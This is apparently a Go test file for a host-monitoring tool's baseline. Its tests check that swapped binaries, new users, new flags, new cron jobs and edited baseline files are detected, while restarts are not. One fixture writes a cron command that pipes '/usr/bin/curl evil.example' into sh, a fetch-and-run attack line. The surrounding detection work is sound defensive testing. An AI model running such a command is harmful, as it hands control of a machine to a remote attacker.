package main

// The baseline's job is one comparison: "have I seen this before?" These tests
// are the two ways that comparison fails, because they fail in opposite
// directions and a fix for one is the cause of the other.
//
//	TOO LOOSE  a swapped binary reads as the same program — the detection
//	           story's central claim quietly stops being true.
//	TOO TIGHT  every service restart reads as something new — the finding list
//	           fills with noise and nobody reads the real one.

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// ── too loose ───────────────────────────────────────────────────────────────

// A DIFFERENT BINARY AT THE SAME PATH IS NOT THE SAME PROGRAM. This is the
// attack the digest is in the fingerprint for: drop something new at
// /usr/bin/node and a path-keyed baseline says "seen it".
func TestASwappedBinaryIsNotTheSameEntry(t *testing.T) {
	const user, unit, shape = "user", "service", "node server.js"
	before := baselineFP("process", "aaaaaaaaaaaa", user, unit, shape)
	after := baselineFP("process", "bbbbbbbbbbbb", user, unit, shape)
	if before == after {
		t.Fatal("the same path with different CONTENT produced the same fingerprint. " +
			"A path is a name anything can be moved to; the digest is the only field " +
			"here that changes when the program does.")
	}
}

// The same binary run by a different user is a different fact about this
// machine — collapsing them hides a privilege step.
func TestTheSameBinaryUnderADifferentUserIsADifferentEntry(t *testing.T) {
	a := baselineFP("process", "aaaa", "user", "service", "x")
	b := baselineFP("process", "aaaa", "root", "service", "x")
	if a == b {
		t.Error("the same program as user and as root fingerprinted identically, so a " +
			"process that gained root would read as already-known")
	}
}

// A flag that changes what a program DOES survives the masking. This is the
// balance point of the whole file: mask too much and this is what is lost.
func TestANewFlagIsNotMaskedAway(t *testing.T) {
	// SAME NUMBER OF ARGUMENTS, different meaning. The first version of this
	// test compared one flag against two, so a mutation that masked every flag
	// to "<flag>" still produced different shapes and the test passed — it was
	// measuring the argument COUNT, not whether the argument survived. Two
	// flags either side is the assertion that cannot pass that way.
	harmless := baselineArgvShape("/usr/bin/chrome --headless --disable-gpu")
	loaded := baselineArgvShape("/usr/bin/chrome --headless --load-extension=/opt/x")
	if harmless == loaded {
		t.Errorf("--load-extension was masked away: %q == %q. The masking exists for "+
			"values that change between runs of the same program, never for arguments "+
			"that change what it does.", harmless, loaded)
	}
	// And the value it carries is part of the shape: a different extension is a
	// different program, even though both are --load-extension.
	other := baselineArgvShape("/usr/bin/chrome --headless --load-extension=/opt/y")
	if other == loaded {
		t.Errorf("two different extensions produced the same shape: %q", other)
	}
}

// ── too tight ───────────────────────────────────────────────────────────────

// A RESTART IS THE SAME ENTRY. Ports, pids, temp paths and request ids all
// change when a service bounces; if any of them reached the fingerprint, every
// restart on the box would be a finding.
func TestARestartWithVolatileArgumentsIsTheSameEntry(t *testing.T) {
	for _, c := range []struct{ name, a, b string }{
		{"a port", "worker --port 41551", "worker --port 52233"},
		{"a pid", "helper --parent 8123", "helper --parent 9471"},
		{"a temp path", "svc --sock /tmp/abc123/s.sock", "svc --sock /tmp/zzz999/s.sock"},
		{"a request id", "job --id 4f3a9b2c8e1d", "job --id 99aa77bb55cc"},
		{"a uuid", "svc --run 3f2504e0-4f89-11d3-9a0c-0305e82c3301",
			"svc --run 7c9e6679-7425-40de-944b-e07fc1f90ae7"},
	} {
		t.Run(c.name, func(t *testing.T) {
			if got, want := baselineArgvShape(c.a), baselineArgvShape(c.b); got != want {
				t.Errorf("%s made a restart look like a new program:\n  %q\n  %q",
					c.name, got, want)
			}
		})
	}
}

// The masking must not depend on the order the patterns happen to run in. A
// UUID is made of hex runs, so hex-first would eat it piecemeal and produce a
// different shape for the same string.
func TestAUUIDIsMaskedWholeAndNotInPieces(t *testing.T) {
	got := baselineArgvShape("svc --run 3f2504e0-4f89-11d3-9a0c-0305e82c3301")
	if !strings.Contains(got, "<uuid>") {
		t.Errorf("a uuid was not masked as one thing: %q", got)
	}
	if strings.Contains(got, "<hex>") {
		t.Errorf("a uuid was eaten in pieces by the hex rule: %q — the order in "+
			"baselineArgvShape is load-bearing", got)
	}
}

// Four workers of one service are ONE fact about this machine. A baseline that
// records a row per pid grows on every restart and is worthless by the week.
func TestIdenticalProcessesCollapseToOneEntry(t *testing.T) {
	obs := []agentObs{
		{PID: 1, User: "user", Cmdline: "worker --port 3001", Origin: "service"},
		{PID: 2, User: "user", Cmdline: "worker --port 3002", Origin: "service"},
		{PID: 3, User: "user", Cmdline: "worker --port 3003", Origin: "service"},
	}
	got, _ := baselineFromObservations(obs, baselineExeDigest)
	if len(got) != 1 {
		t.Errorf("three workers of one service produced %d entries, want 1", len(got))
	}
}

// ── what it could not see ───────────────────────────────────────────────────

// AN UNREADABLE EXECUTABLE IS COUNTED AND EXPLAINED, never silently dropped.
// A baseline taken without administrator rights is a smaller truth than one
// taken with them, and the number is how a reader knows which they hold.
func TestWhatCouldNotBeReadIsCountedAndSaysWhy(t *testing.T) {
	obs := []agentObs{
		{PID: 1, User: "user", Exe: "", Cmdline: "something"},
		{PID: 2, User: "user", Exe: "/no/such/file", Cmdline: "other"},
	}
	got, unreadable := baselineFromObservations(obs, baselineExeDigest)
	if unreadable != 2 {
		t.Errorf("unreadable = %d, want 2", unreadable)
	}
	for _, e := range got {
		if e.ExeDigest != "" {
			t.Errorf("%s got a digest from a file that cannot be read", e.FP)
		}
		if e.DigestNote == "" {
			t.Errorf("%s has no digest and does not say why. An empty digest with no "+
				"reason reads as 'nothing to see'; it is usually 'this box could not "+
				"look', which is a different fact.", e.FP)
		}
	}
}

// A real file gets a real digest, so the test above is not passing because
// nothing can ever be hashed.
func TestAReadableExecutableIsActuallyHashed(t *testing.T) {
	p := filepath.Join(t.TempDir(), "prog")
	if err := os.WriteFile(p, []byte("#!/bin/sh\necho hi\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	d, note := baselineExeDigest(p)
	if d == "" {
		t.Fatalf("a readable regular file produced no digest: %s", note)
	}
	if len(d) != 64 {
		t.Errorf("digest is %d chars, want a 64-char sha256", len(d))
	}
	// And the digest is of the CONTENT: change one byte, get a different answer.
	if err := os.WriteFile(p, []byte("#!/bin/sh\necho ho\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	d2, _ := baselineExeDigest(p)
	if d2 == d {
		t.Error("editing the file did not change its digest")
	}
}

// ── the file on disk ────────────────────────────────────────────────────────

// A baseline edited on disk must not read as the one that was taken.
func TestAnEditedBaselineNoLongerMatchesItsOwnDigest(t *testing.T) {
	uiTestConfigDir(t)
	f := baselineFile{
		Version: baselineVersion, TakenAt: "2026-09-14T00:00:00Z",
		Entries: []baselineEntry{{FP: "abc", Kind: "process", User: "user"}},
	}
	if err := baselineSave(f); err != nil {
		t.Fatal(err)
	}
	got, ok, err := baselineLoad()
	if err != nil {
		t.Fatal(err)
	}
	if !ok {
		t.Fatal("a baseline this test just wrote does not match its own digest")
	}
	if len(got.Entries) != 1 {
		t.Fatalf("entries = %d, want 1", len(got.Entries))
	}

	// Now edit it the way somebody covering their tracks would: add an entry,
	// so a new process reads as baseline.
	p, err := baselinePath()
	if err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	edited := strings.Replace(string(b), `"fp": "abc"`, `"fp": "abc-tampered"`, 1)
	if edited == string(b) {
		t.Fatal("the fixture did not change, so this test proves nothing about editing")
	}
	if err := os.WriteFile(p, []byte(edited), 0o600); err != nil {
		t.Fatal(err)
	}
	got, ok, err = baselineLoad()
	if err != nil {
		t.Fatal(err)
	}
	if ok {
		t.Error("an edited baseline still matched its digest")
	}
	// And it is still READABLE: the caller needs to say "this was edited" and
	// show what it says, which is more use than refusing to open it.
	if got == nil || len(got.Entries) != 1 {
		t.Error("an edited baseline could not be read at all, so nothing can report " +
			"what it was changed to")
	}
}

// The baseline file holds the names of every automated program on the machine,
// its user and its command line. Same permissions as every other record here.
func TestTheBaselineIsWrittenPrivate(t *testing.T) {
	uiTestConfigDir(t)
	if err := baselineSave(baselineFile{Version: baselineVersion}); err != nil {
		t.Fatal(err)
	}
	p, err := baselinePath()
	if err != nil {
		t.Fatal(err)
	}
	fi, err := os.Stat(p)
	if err != nil {
		t.Fatal(err)
	}
	if runtime.GOOS == "windows" {
		t.Skip("unix permission bits do not carry the same meaning here")
	}
	if got := fi.Mode().Perm(); got != 0o600 {
		t.Errorf("baseline.json is %o, want 600 — it names every automated program on "+
			"this machine, its user and its command line", got)
	}
}

// ── standing jobs are part of what is normal ────────────────────────────────

// A CRON JOB ADDED AFTER THE BASELINE MUST BE SOMETHING THE DELTA CAN SEE.
// The accounting is meant to hold standing jobs, and baselineEntry.Kind has always
// documented `process | scheduler | listener`, while only processes were
// recorded — so scheduled work was outside the vocabulary the delta compares
// against, invisible to the thing built to notice new work.
func TestScheduledJobsAreInTheBaseline(t *testing.T) {
	got := baselineFromSchedulers([]schedEntry{
		{Kind: "cron", Name: "/etc/cron.d/backup:3", Command: "/usr/bin/backup --to /tmp/x99",
			User: "root", Signature: "backup"},
		{Kind: "systemd-timer", Name: "sweep.timer", Command: "/usr/bin/sweep", User: "user"},
	})
	if len(got) != 2 {
		t.Fatalf("%d scheduler entries, want 2", len(got))
	}
	for _, e := range got {
		if e.Kind != "scheduler" {
			t.Errorf("entry kind %q, want scheduler", e.Kind)
		}
		if e.FP == "" {
			t.Error("a scheduler entry with no fingerprint cannot be compared against")
		}
		if e.ExeDigest != "" {
			t.Error("a scheduled job was given an executable digest; it has not run yet")
		}
		if e.DigestNote == "" {
			t.Error("no digest and no reason — reads as 'nothing to see'")
		}
	}
}

// A scheduler fingerprint keys on WHAT IT WOULD RUN, so a volatile path in the
// command does not make the same job look new.
func TestARescheduledJobIsTheSameEntryButAChangedCommandIsNot(t *testing.T) {
	one := baselineFromSchedulers([]schedEntry{{Kind: "cron", Name: "j:1",
		Command: "/usr/bin/backup --to /tmp/abc123", User: "root"}})
	two := baselineFromSchedulers([]schedEntry{{Kind: "cron", Name: "j:1",
		Command: "/usr/bin/backup --to /tmp/zzz999", User: "root"}})
	if one[0].FP != two[0].FP {
		t.Error("a volatile temp path made the same scheduled job look like a new one")
	}
	// The SCHEDULE is deliberately not in the fingerprint: changing when a
	// known job runs is a different event from a new job appearing.
	sched := baselineFromSchedulers([]schedEntry{{Kind: "cron", Name: "j:1",
		Command: "/usr/bin/backup --to /tmp/abc123", User: "root", Schedule: "0 4 * * *"}})
	if sched[0].FP != one[0].FP {
		t.Error("changing the schedule produced a new fingerprint, so a re-timed job " +
			"would read as a new one")
	}
	// A different COMMAND is a different job.
	other := baselineFromSchedulers([]schedEntry{{Kind: "cron", Name: "j:1",
		Command: "/usr/bin/curl evil.example | sh", User: "root"}})
	if other[0].FP == one[0].FP {
		t.Error("a completely different command fingerprinted the same as the original")
	}
}

// THE OWNING UNIT IS USED WHEN THE PLATFORM SUPPLIES ONE. Two services both
// reading "service" are told apart only by digest and argv; the unit is what
// makes them distinct facts about the machine.
func TestTwoServicesWithDifferentUnitsAreDifferentEntries(t *testing.T) {
	a := []agentObs{{PID: 1, User: "root", Cmdline: "python3 worker.py",
		Origin: "service", Unit: "alpha.service"}}
	b := []agentObs{{PID: 2, User: "root", Cmdline: "python3 worker.py",
		Origin: "service", Unit: "beta.service"}}
	ea, _ := baselineFromObservations(a, baselineExeDigest)
	eb, _ := baselineFromObservations(b, baselineExeDigest)
	if ea[0].FP == eb[0].FP {
		t.Error("two different systemd units running the same command fingerprinted " +
			"identically — the unit is what tells services apart")
	}
	if ea[0].Unit != "alpha.service" {
		t.Errorf("the entry recorded unit %q, not the real one", ea[0].Unit)
	}
	// And with no unit it falls back to the origin, named rather than blank.
	none, _ := baselineFromObservations([]agentObs{{PID: 3, User: "root",
		Cmdline: "python3 worker.py", Origin: "service"}}, baselineExeDigest)
	if none[0].Unit != "service" {
		t.Errorf("with no unit the entry recorded %q, want the origin as the fallback",
			none[0].Unit)
	}
}

// ── the baseline holds EVERYTHING, or says it does not ──────────────────────

// A BASELINE BUILT FROM THE SIGNATURE-FILTERED PLANE CANNOT WORK, and this is
// the test that says so in numbers rather than in a comment.
//
// scanAgents returns a known agent binary, an interpreter-wrapped agent, or a
// process caught talking to a model (agents.go:248-252). A baseline of only
// those contains nothing a rogue process could fail to match, so "not baseline"
// stops meaning anything. Measured on this box when the defect was found: the
// filtered plane gave 1 entry and the unfiltered walk gives 118.
func TestTheBaselineCoversMoreThanTheRecognisedAgents(t *testing.T) {
	all, complete := baselineAllProcesses()
	if !complete {
		t.Skip("this platform has no unfiltered walk yet; cmdObserveBaseline says so in " +
			"its output and the file records coverage=recognised-only")
	}
	recognised, err := scanAgents()
	if err != nil {
		t.Fatal(err)
	}

	// THE WIRING, not just the two sources. A mutation that pointed the baseline
	// back at the filtered plane passed the comparison below, because nothing
	// exercised which one collectBaseline actually uses.
	f, _, _, _, err := collectBaseline()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(f.Coverage, "processes=all") {
		t.Errorf("the baseline reports coverage %q on a platform that HAS an unfiltered "+
			"walk — it is being built from the filtered plane", f.Coverage)
	}
	if len(f.Entries) <= len(recognised) {
		t.Errorf("the baseline holds %d entries and the filtered plane sees %d. The "+
			"baseline is being built from the wrong source.", len(f.Entries), len(recognised))
	}

	if len(all) <= len(recognised) {
		t.Fatalf("the unfiltered walk found %d processes and the signature-filtered "+
			"plane found %d. If those are the same, the baseline can only ever contain "+
			"things already recognised as agents — and a brand-new unknown binary, the "+
			"thing this feature exists to catch, would be absent from the baseline AND "+
			"from every delta computed against it.", len(all), len(recognised))
	}
	// And the unrecognised ones are really in there, with no signature — the
	// classification is a property, never a condition for being recorded.
	unsigned := 0
	for _, a := range all {
		if a.Signature == "" {
			unsigned++
		}
	}
	if unsigned == 0 {
		t.Error("every process in the unfiltered walk carries a signature, so this is " +
			"still the filtered plane wearing a different name")
	}
	t.Logf("%d processes, %d of them unrecognised; the filtered plane sees %d",
		len(all), unsigned, len(recognised))
}

// The file SAYS which truth it holds, because a delta against a recognised-only
// baseline can only ever notice recognised things.
func TestTheBaselineRecordsItsOwnCoverage(t *testing.T) {
	// EVERY HALF, separately. One word said "all-processes" while the
	// scheduler half was recognised-only, which told a reader the opposite of
	// the truth about the half that matters for persistence. The listener and
	// identity halves report `unsupported` rather than
	// `recognised-only` — a reader that did not look at all is a different fact
	// from one that looked and saw a subset.
	if got := baselineCoverage(true, true, true, true); got !=
		"processes=all,schedulers=all,listeners=all,identities=login-shells" {
		t.Errorf("coverage(all) = %q", got)
	}
	if got := baselineCoverage(true, false, true, true); got !=
		"processes=all,schedulers=recognised-only,listeners=all,identities=login-shells" {
		t.Errorf("a recognised-only scheduler half is not reported: %q", got)
	}
	if got := baselineCoverage(false, false, false, false); got !=
		"processes=recognised-only,schedulers=recognised-only,listeners=unsupported,identities=unsupported" {
		t.Errorf("coverage(partial) = %q", got)
	}
	// A BLIND HALF MUST NOT READ AS AN EMPTY ONE — the distinction the whole
	// class guard rests on.
	if baselineHasClass(baselineCoverage(true, true, false, false), "listeners") {
		t.Error("an unsupported listener half reads as covered, so a delta would " +
			"report every listener on the box as new")
	}
	if !baselineHasClass(baselineCoverage(true, true, true, true), "identities") {
		t.Error("a covered identity half reads as unsupported, so identities would never be compared")
	}
	// A baseline written before either class existed says nothing about them,
	// and that must read as "not looked at" rather than as "covered".
	if baselineHasClass("processes=all,schedulers=all", "listeners") {
		t.Error("a coverage line from before the listener class reads as covering listeners")
	}
	uiTestConfigDir(t)
	if err := baselineSave(baselineFile{Version: baselineVersion,
		Coverage: "processes=all,schedulers=all"}); err != nil {
		t.Fatal(err)
	}
	f, ok, err := baselineLoad()
	if err != nil || !ok {
		t.Fatalf("load: %v ok=%v", err, ok)
	}
	if f.Coverage != "processes=all,schedulers=all" {
		t.Errorf("coverage did not survive a round trip: %q", f.Coverage)
	}
}

// THE SCHEDULER HALF, WIRED. The scheduler tests fed synthetic entries into
// baselineFromSchedulers, so nothing held WHICH LIST collectBaseline consumes —
// the same wiring-vs-source gap that let a mutation fool the process test.
// Measured when this was found: the plane discovered 68 standing jobs and 0
// survived the signature filter, so the baseline recorded "0 scheduled jobs"
// while 68 existed.
func TestTheBaselineTakesEverySchedulerNotOnlyRecognisedOnes(t *testing.T) {
	raw, _, supported := platformSchedulers()
	if !supported || len(raw) == 0 {
		t.Skip("this box exposes no standing jobs to compare against")
	}
	filtered, _ := scanSchedulers()
	if len(raw) == len(filtered) {
		t.Skip("every standing job here is recognised, so the two lists cannot be told apart")
	}

	f, _, schedCount, _, err := collectBaseline()
	if err != nil {
		t.Fatal(err)
	}
	if schedCount <= len(filtered) {
		t.Errorf("collectBaseline took %d standing jobs; the signature-filtered list has "+
			"%d and the real inventory has %d. A cron job running an unrecognised "+
			"command is the canonical persistence move, and a baseline that omits it "+
			"has nothing for the delta to compare against.", schedCount, len(filtered), len(raw))
	}
	got := 0
	for _, e := range f.Entries {
		if e.Kind == "scheduler" {
			got++
		}
	}
	if got <= len(filtered) {
		t.Errorf("the baseline holds %d scheduler entries, the filtered list has %d", got, len(filtered))
	}
}
